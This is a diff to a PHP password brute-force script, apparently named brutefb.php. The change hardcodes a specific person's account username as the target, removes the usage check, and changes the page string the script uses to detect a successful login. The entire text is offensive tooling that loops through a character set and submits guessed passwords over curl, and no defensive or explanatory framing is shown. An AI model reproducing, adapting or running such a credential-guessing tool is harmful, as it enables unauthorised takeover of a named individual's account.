@@ -3,16 +3,12 @@
 global $wrong;
 global $startpagina;
 $time = microtime() * 100000;
-$username = $_SERVER["argv"][1];
+$username = "charlotte.scheurleer1";
 echo "https://twitter.com/LizardL4nds";
 $Pass = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%&*';          /*character set which is used to brute force the password*/
 $c_len = strlen($Pass); 
 $min = 1;
 $max = 12;
-if ($_SERVER["argc"] < 1) {
-  print "Usage: brutefb.php <username>\n";
-  exit;
-}
 function bruteForce($Pass)
 {
 while(True)
@@ -36,7 +32,7 @@ function check_correct($Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c); 
-	if($str != "What is on your mind?") {return true;}
+	if($str != "Startpagina") {return true;}
         else {return ;}
 }
 bruteForce($Pass);
